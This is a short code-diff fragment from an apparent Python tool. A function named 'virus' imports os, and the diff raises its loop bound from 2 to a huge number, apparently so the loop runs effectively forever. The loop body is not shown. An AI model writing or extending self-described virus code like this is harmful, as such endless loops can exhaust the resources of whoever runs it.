@@ -66,7 +66,7 @@ def toolshack():
     def virus():
     	import os
     	s=1
-    	h=2
+    	h=10000000000000000000000000000000000000000000
     
     
     	while s < h:
